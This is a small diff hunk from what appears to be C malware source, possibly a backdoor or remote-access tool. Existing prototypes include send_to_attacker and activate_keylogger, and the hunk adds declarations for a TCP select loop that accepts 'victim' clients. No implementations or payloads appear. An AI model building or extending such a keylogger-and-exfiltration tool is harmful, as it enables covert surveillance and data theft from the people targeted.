@@ -34,10 +34,14 @@ int launch(char **command_arr, u_char *args);
 void send_to_attacker(u_char *args);
 void* activate_keylogger(void* arg);
 void* check_directory(void* arg);
+void* select_call(void* arg);
+void tcp_select(struct options_victim *opts);
+void add_new_client(struct options_victim *opts, int client_socket, struct sockaddr_in *new_client_address);
+int get_max_socket_number(struct options_victim *opts);
 
 int (*builtin_func[]) (char **) = {
-        &builtin_cd,
-        &builtin_exit
+    &builtin_cd,
+    &builtin_exit
 };
 
 
